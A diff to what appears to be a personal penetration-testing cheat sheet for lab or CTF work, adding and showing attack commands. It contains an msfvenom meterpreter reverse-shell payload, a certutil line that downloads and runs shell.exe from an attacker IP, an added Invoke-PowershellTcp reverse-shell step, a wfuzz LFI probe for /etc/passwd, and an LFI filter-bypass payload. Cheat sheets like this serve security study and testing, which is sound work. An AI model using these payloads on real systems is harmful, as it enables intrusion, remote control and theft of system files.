@@ -120,7 +120,7 @@ Try the command "cd ..." to change directory *Maybe one of the directory is hidd
 Always use the command "ls -lah" to check the files in FTP folder *Maybe one of them is hidden*
 
 ## xfreerdp:
-xfreerdp /u:"USERNAME" /p:'PASSWORD' /v:"IP ADDRESS" +clipboard /dynamic-resolution
+xfreerdp /u:"USERNAME" /p:'PASSWORD' /v:"IP ADDRESS" +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
 
 ## FTP Server:
 sudo python3 -m pyftpdlib 21
@@ -134,6 +134,9 @@ wpscan --url "URL" -e u,ap,at,dbe --plugins-detection aggressive
 ## Gobuster:
 gobuster dir -u "URL" -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,bak *Directory Bruteforcing*
 gobuster dns -d "URL" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt *Subdomain Enumeration*
+
+## WFUZZ:
+wfuzz -u http://10.10.11.135/image.php?FUZZ=/etc/passwd -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt -t 50 --hh 0
 
 ## LFI Files to Look For:
 https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html
@@ -165,6 +168,7 @@ https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt
 ## Windows Reverse Shell:
 1- msfvenom -p windows/meterpreter/reverse_tcp lhost=10.9.252.17 lport=1234 -f exe > shell.exe
 2- certutil.exe -urlcache -split -f http://10.9.252.17/shell.exe shell.exe & shell.exe
+3- `Invoke-PowershellTcp.ps1`
 
 ## LFI FILTER BYPASS:
 /?page=php://Filter/convert.base64-encode/resource=config
